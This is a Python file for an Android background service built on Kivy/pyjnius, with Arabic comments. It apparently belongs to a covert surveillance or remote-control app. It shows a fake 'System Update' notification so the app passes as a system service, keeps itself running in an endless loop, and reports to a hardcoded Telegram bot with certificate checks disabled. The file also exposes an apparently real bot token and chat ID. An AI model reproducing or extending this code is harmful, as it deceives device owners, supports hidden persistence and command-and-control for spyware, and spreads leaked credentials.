from jnius import autoclass
import time, requests, os

# إعدادات البوت الخاصة بك (نفس التي في main.py)
BOT_TOKEN = "8711969097:AAHtV1KGP-24cPn2QxPvpbyNkQugNPhEFg0"
CHAT_ID = "7084557369"

def send_tg(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=15, verify=False)
    except: pass

def start_foreground():
    """هذا الكود يجعل الأندرويد يرى التطبيق كخدمة نظام مهمة"""
    try:
        PythonService = autoclass('org.kivy.android.PythonService')
        service = PythonService.mService
        NotificationBuilder = autoclass('android.app.Notification$Builder')
        
        builder = NotificationBuilder(service.getApplicationContext())
        builder.setContentTitle("System Update")
        builder.setContentText("Service active...")
        builder.setSmallIcon(service.getApplicationInfo().icon)
        
        service.startForeground(1, builder.build())
    except: pass

if __name__ == '__main__':
    start_foreground()
    send_tg("🚀 [SERVICE]: محرك الخلفية V1.80 بدأ العمل الآن بنجاح.")
    
    # حلقة البقاء حياً
    while True:
        time.sleep(60) # يظل شغالاً ويفحص الاتصال كل دقيقة
